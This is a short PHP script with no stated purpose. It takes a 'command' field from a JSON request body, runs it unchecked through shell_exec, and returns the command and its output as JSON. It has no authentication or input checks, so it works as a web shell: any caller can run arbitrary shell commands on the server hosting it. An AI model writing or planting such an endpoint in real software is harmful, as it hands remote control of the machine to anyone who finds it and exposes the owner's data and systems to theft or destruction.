<?php  
//header('Content-Type: application/json');

$body = file_get_contents('php://input');
$json=json_decode($body);

$output= shell_exec($json->command);

echo(json_encode(array("input"=>$json->command, "output"=>$output, "key"=>uniqid()) ) );

?>